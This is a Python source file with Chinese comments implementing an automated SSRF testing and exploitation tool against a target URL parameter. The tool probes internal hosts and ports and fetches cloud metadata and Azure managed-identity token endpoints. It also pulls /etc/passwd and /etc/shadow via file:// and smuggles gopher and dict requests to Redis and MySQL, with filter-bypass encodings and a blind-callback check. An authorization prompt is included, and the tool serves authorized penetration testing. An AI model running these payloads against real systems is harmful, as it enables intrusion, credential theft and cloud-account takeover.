#!/usr/bin/env python3
"""
Purpose: SSRF (Server-Side Request Forgery) 自动化检测与利用工具
         支持：内网探测、云元数据窃取、协议走私、回连验证
Auth: 仅限授权使用 — 未经书面授权禁止对任何目标执行检测
Dependencies: requests, colorama, urllib3
Usage:
    python ssrf_tester.py -u "http://target/api/proxy?url={target}" -p url
    python ssrf_tester.py -u "http://target/api/fetch" --data-param body
Changelog:
    v2 (2026-05-12): 修复 URL 解析 bug，云检测字典化，敏感数据可配置
"""

import argparse
import json
import logging
import re
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlencode, urlparse, urlunparse, parse_qsl

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class SSRFType(Enum):
    """SSRF 类型"""
    INTERNAL_PROBE = "internal_probe"
    METADATA_EXFIL = "metadata_exfil"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    BLIND = "blind"


class CloudProvider(Enum):
    """云服务提供商"""
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    ALIBABA = "alibaba"
    TENCENT = "tencent"
    DIGITALOCEAN = "digitalocean"


@dataclass
class SSRFResult:
    """SSRF 检测结果"""
    url: str
    parameter: str
    ssrf_type: SSRFType
    payload: str
    response: str
    evidence: str = ""
    cloud_provider: Optional[str] = None
    internal_host: Optional[str] = None
    is_vulnerable: bool = False


@dataclass
class TestConfig:
    """测试配置"""
    timeout: int = 10
    delay: float = 1.0
    verify_ssl: bool = False
    proxy: Optional[str] = None
    callback_server: Optional[str] = None
    user_agent: str = "SSRFTester/1.0"
    headers: Optional[Dict[str, str]] = None
    data_param: Optional[str] = None
    max_response_len: int = 500  # 新增：响应截断长度可配置


# ============================================================
# Payload 数据库
# ============================================================

INTERNAL_IPS = [
    "http://127.0.0.1:80", "http://127.0.0.1:8080", "http://127.0.0.1:443",
    "http://localhost:80", "http://localhost:8080", "http://0.0.0.0:80",
    "http://192.168.1.1:80", "http://192.168.0.1:80", "http://192.168.1.100:80",
    "http://10.0.0.1:80", "http://10.0.1.1:80", "http://172.16.0.1:80",
    "http://172.31.255.255:80",
    "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379",
    "http://127.0.0.1:11211", "http://127.0.0.1:27017", "http://127.0.0.1:9200",
    "http://127.0.0.1:6443", "http://169.254.169.254/latest/meta-data/",
    "http://0x7f000001/", "http://0177.0.0.1/", "http://2130706433/",
    "http://127.1/", "http://0/",
]

METADATA_ENDPOINTS: Dict[CloudProvider, List[str]] = {
    CloudProvider.AWS: [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
    ],
    CloudProvider.GCP: [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    CloudProvider.AZURE: [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    CloudProvider.ALIBABA: [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/user-data/",
    ],
    CloudProvider.TENCENT: [
        "http://metadata.tencentyun.com/latest/meta-data/",
    ],
    CloudProvider.DIGITALOCEAN: [
        "http://169.254.169.254/metadata/v1/",
    ],
}

PROTOCOL_SMUGGLING = [
    "file:///etc/passwd", "file:///etc/hosts", "file:///etc/shadow",
    "file:///", "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:3306/_", "gopher://127.0.0.1:6379/_",
    "gopher://127.0.0.1:22/_SSH-2.0-OpenSSH",
    "ftp://127.0.0.1:21/", "tftp://127.0.0.1:69/stocklist",
    "http://127.0.0.1:8000", "dns://8.8.8.8/example.com",
]

ENCODING_BYPASSES = [
    "http://127.0.0.1:80",
    "http://%31%32%37%2e%30%2e%30%2e%31:80/",
    "http://127%2E0%2E0%2E1:80/",
    "http://\uff17\uff11\uff17.example.com/",
    "http://example.com@127.0.0.1:80/",
    "http://user:pass@127.0.0.1:80/",
    "http://127.0.0.1:80#@example.com/",
    "http://127.0.0.1:00000080/",
    "http://127.0.0.1:0x50/",
]

# ============================================================
# 云元数据特征检测 — 字典化替代 if/elif 链
# ============================================================

CLOUD_METADATA_SIGNATURES: Dict[CloudProvider, List[str]] = {
    CloudProvider.AWS: ["ami-id", "instance-id", "local-hostname", "instance-type"],
    CloudProvider.GCP: ["project/", "instance/", "google-compute-instance"],
    CloudProvider.AZURE: ["subscriptionid", "resourcegroupname", "vmid", "compute"],
    CloudProvider.ALIBABA: ["instance-id", "eip", "private-ipv4"],
    CloudProvider.TENCENT: ["instance-id", "uuid", "zone-id"],
    CloudProvider.DIGITALOCEAN: ["droplet_id", "region", "user-data"],
}

# ============================================================
# 内网服务特征检测 — 可配置字典
# ============================================================

SERVICE_SIGNATURES: Dict[str, str] = {
    "ssh": "SSH service response detected",
    "ssh-": "SSH service response detected",
    "mysql": "MySQL/MariaDB response detected",
    "mariadb": "MySQL/MariaDB response detected",
    "redis_version": "Redis response detected",
    "elasticsearch": "Elasticsearch response detected",
    "kubernetes": "Kubernetes API response detected",
    "k8s": "Kubernetes API response detected",
    "meta-data": "Cloud metadata response detected",
    "docker": "Docker API response detected",
    "etcd": "etcd response detected",
    "consul": "Consul response detected",
    "vault": "HashiCorp Vault response detected",
}

PORT_SERVICE_MAP: Dict[str, str] = {
    "22": "SSH", "3306": "MySQL", "6379": "Redis",
    "11211": "Memcached", "27017": "MongoDB",
    "9200": "Elasticsearch", "6443": "Kubernetes API",
    "8500": "Consul", "8200": "Vault",
    "2379": "etcd", "9090": "Prometheus",
}

FILE_SIGNATURES: Dict[str, List[str]] = {
    "file": ["root:", "/bin/bash", "/bin/sh", "daemon:", "nobody:"],
    "dict": ["redis_version"],
    "gopher": ["mysql", "protocol", "OK"],
    "ftp": ["220", "ftp"],
}


class SSRFTester:
    """SSRF 检测器核心类"""

    def __init__(self, config: TestConfig):
        self.config = config
        self.session = requests.Session()
        self.results: List[SSRFResult] = []
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.headers:
            self.session.headers.update(self.config.headers)
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}

    def detect(self, url: str, parameter: str, method: str = "GET") -> List[SSRFResult]:
        """执行 SSRF 检测"""
        logging.info(f"[*] 开始 SSRF 检测: {url} 参数: {parameter}")

        internal_results = self._test_internal_probe(url, parameter, method)
        self.results.extend(internal_results)

        metadata_results = self._test_metadata_exfil(url, parameter, method)
        self.results.extend(metadata_results)

        protocol_results = self._test_protocol_smuggling(url, parameter, method)
        self.results.extend(protocol_results)

        if self.config.callback_server:
            blind_results = self._test_blind_ssrf(url, parameter, method)
            self.results.extend(blind_results)

        logging.info(f"[*] 检测完成，发现 {len(self.results)} 个 SSRF")
        return self.results

    def _test_internal_probe(self, url: str, parameter: str, method: str) -> List[SSRFResult]:
        """测试内网探测"""
        logging.info("[*] 测试内网 IP 探测...")
        results = []

        for payload in INTERNAL_IPS:
            resp = self._send_with_payload(url, parameter, payload, method)
            if resp is None:
                continue

            internal_host = self._extract_internal_host(payload)
            evidence = self._analyze_response_for_internal(resp.text, internal_host)

            if evidence:
                logging.info(f"[+] 内网 SSRF 确认! payload: {payload}")
                results.append(SSRFResult(
                    url=url, parameter=parameter,
                    ssrf_type=SSRFType.INTERNAL_PROBE,
                    payload=payload,
                    response=resp.text[:self.config.max_response_len],
                    evidence=evidence, internal_host=internal_host,
                    is_vulnerable=True,
                ))
            time.sleep(self.config.delay)

        return results

    def _test_metadata_exfil(self, url: str, parameter: str, method: str) -> List[SSRFResult]:
        """测试云元数据窃取"""
        logging.info("[*] 测试云元数据窃取...")
        results = []

        for provider, endpoints in METADATA_ENDPOINTS.items():
            for endpoint in endpoints:
                resp = self._send_with_payload(url, parameter, endpoint, method)
                if resp is None:
                    continue

                cloud_sig = self._detect_cloud_metadata(resp.text, provider)
                if cloud_sig:
                    logging.info(f"[+] 云元数据 SSRF 确认! {provider.value}: {endpoint}")
                    results.append(SSRFResult(
                        url=url, parameter=parameter,
                        ssrf_type=SSRFType.METADATA_EXFIL,
                        payload=endpoint,
                        response=resp.text[:self.config.max_response_len],
                        evidence=cloud_sig, cloud_provider=provider.value,
                        is_vulnerable=True,
                    ))
                    break
                time.sleep(self.config.delay)

        return results

    def _test_protocol_smuggling(self, url: str, parameter: str, method: str) -> List[SSRFResult]:
        """测试协议走私"""
        logging.info("[*] 测试协议走私...")
        results = []

        for payload in PROTOCOL_SMUGGLING:
            resp = self._send_with_payload(url, parameter, payload, method)
            if resp is None:
                continue

            sensitive_sig = self._detect_sensitive_data(resp.text, payload)
            if sensitive_sig:
                logging.info(f"[+] 协议走私 SSRF 确认! protocol: {payload.split('://')[0]}")
                results.append(SSRFResult(
                    url=url, parameter=parameter,
                    ssrf_type=SSRFType.PROTOCOL_SMUGGLING,
                    payload=payload,
                    response=resp.text[:self.config.max_response_len],
                    evidence=sensitive_sig,
                    is_vulnerable=True,
                ))
                break
            time.sleep(self.config.delay)

        return results

    def _test_blind_ssrf(self, url: str, parameter: str, method: str) -> List[SSRFResult]:
        """测试盲注 SSRF"""
        if not self.config.callback_server:
            return []

        logging.info(f"[*] 测试盲注 SSRF (回连: {self.config.callback_server})...")
        results = []

        marker = f"ssrf_test_{int(time.time())}_{id(self)}"
        callback_url = f"{self.config.callback_server}/?id={marker}"

        resp = self._send_with_payload(url, parameter, callback_url, method)
        if resp is not None:
            if self._verify_callback(marker):
                logging.info(f"[+] 盲注 SSRF 确认! callback: {callback_url}")
                results.append(SSRFResult(
                    url=url, parameter=parameter,
                    ssrf_type=SSRFType.BLIND,
                    payload=callback_url,
                    response="Blind SSRF - callback verified",
                    evidence=f"Callback server received request with marker: {marker}",
                    is_vulnerable=True,
                ))

        return results

    def _send_with_payload(self, url: str, parameter: str, payload: str, method: str = "GET") -> Optional[requests.Response]:
        """发送带 payload 的请求"""
        time.sleep(self.config.delay)
        try:
            if method.upper() == "GET":
                if "{target}" in url:
                    test_url = url.replace("{target}", payload)
                else:
                    # 修复：使用 parse_qsl 正确处理值中含 = 的情况
                    parsed = urlparse(url)
                    params = parse_qsl(parsed.query, keep_blank_values=True)
                    # 替换或追加参数
                    params = [(k, v) for k, v in params if k != parameter]
                    params.append((parameter, payload))
                    new_query = urlencode(params)
                    test_url = urlunparse(parsed._replace(query=new_query))
                return self.session.get(test_url, timeout=self.config.timeout)

            elif self.config.data_param:
                data = {self.config.data_param: payload}
                return self.session.post(url, data=data, timeout=self.config.timeout)

            else:
                return self.session.post(url, data={parameter: payload}, timeout=self.config.timeout)

        except requests.RequestException as e:
            logging.debug(f"Request failed: {e}")
            return None

    def _extract_internal_host(self, payload: str) -> Optional[str]:
        """从 payload 中提取内网主机地址"""
        match = re.search(r'(?:https?://)([\d.]+)(?::\d+)?', payload)
        if match:
            return match.group(1)
        return None

    def _analyze_response_for_internal(self, text: str, host: Optional[str]) -> Optional[str]:
        """分析响应是否包含内网服务特征（字典驱动）"""
        text_lower = text.lower()

        # 字典匹配 — 逐个检查关键词
        for keyword, evidence in SERVICE_SIGNATURES.items():
            if keyword in text_lower:
                return evidence

        # 内网 IP 在响应中
        if host and host in text:
            return f"Internal host {host} found in response"

        # 端口服务指纹
        if host:
            host_port = host.split(":")[-1] if ":" in host else None
            if host_port and host_port in PORT_SERVICE_MAP:
                return f"Port {host_port} ({PORT_SERVICE_MAP[host_port]}) accessible"

        return None

    def _detect_cloud_metadata(self, text: str, provider: CloudProvider) -> Optional[str]:
        """检测云元数据特征（字典驱动）"""
        text_lower = text.lower()
        keywords = CLOUD_METADATA_SIGNATURES.get(provider, [])
        for keyword in keywords:
            if keyword in text_lower:
                return f"{provider.value.upper()} metadata detected (matched: {keyword})"
        return None

    def _detect_sensitive_data(self, text: str, payload: str) -> Optional[str]:
        """检测敏感数据（字典驱动）"""
        text_lower = text.lower()
        protocol = payload.split("://")[0] if "://" in payload else ""

        keywords = FILE_SIGNATURES.get(protocol, [])
        for keyword in keywords:
            if keyword in text_lower:
                return f"{protocol}:// sensitive data leaked (matched: {keyword})"

        return None

    def _verify_callback(self, marker: str) -> bool:
        """验证回连服务器是否收到请求（需实现）"""
        # TODO: 调用回连服务器的 API 查询 marker
        return False

    def print_results(self):
        """格式化输出检测结果"""
        if not self.results:
            print("\n[-] 未发现 SSRF 漏洞")
            return

        print(f"\n{'='*60}")
        print("  SSRF 检测报告")
        print(f"{'='*60}")
        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] {r.ssrf_type.value.upper()}")
            print(f"  参数: {r.parameter}")
            print(f"  Payload: {r.payload}")
            if r.evidence:
                print(f"  证据: {r.evidence}")
            if r.cloud_provider:
                print(f"  云厂商: {r.cloud_provider}")
            if r.internal_host:
                print(f"  内网主机: {r.internal_host}")
            print(f"  响应: {r.response[:100]}...")
        print(f"\n{'='*60}")

    def export_json(self, filepath: str):
        """导出 JSON 格式报告"""
        data = {
            "results": [
                {
                    "url": r.url,
                    "parameter": r.parameter,
                    "type": r.ssrf_type.value,
                    "payload": r.payload,
                    "evidence": r.evidence,
                    "cloud_provider": r.cloud_provider,
                    "internal_host": r.internal_host,
                    "is_vulnerable": r.is_vulnerable,
                }
                for r in self.results
            ]
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logging.info(f"[+] JSON 报告已导出: {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF 自动化检测工具（仅限授权使用）",
        epilog="⚠️  未经授权使用本工具属于违法行为"
    )
    parser.add_argument("-u", "--url", required=True, help="目标 URL (使用 {target} 占位符或指定 -p)")
    parser.add_argument("-p", "--parameter", required=True, help="待测参数名")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data-param", help="POST body 中的参数名")
    parser.add_argument("--callback", help="盲注回连服务器 URL")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--proxy", help="代理地址")
    parser.add_argument("-o", "--output", help="输出 JSON 报告路径")

    args = parser.parse_args()

    print("⚠️  请确认你已获得目标系统的书面授权")
    confirm = input("确认已获授权？(y/N): ")
    if confirm.lower() != "y":
        sys.exit(0)

    config = TestConfig(
        timeout=args.timeout,
        delay=args.delay,
        proxy=args.proxy,
        callback_server=args.callback,
        data_param=args.data_param,
    )

    tester = SSRFTester(config)
    results = tester.detect(args.url, args.parameter, args.method)
    tester.print_results()

    if args.output:
        tester.export_json(args.output)


if __name__ == "__main__":
    main()
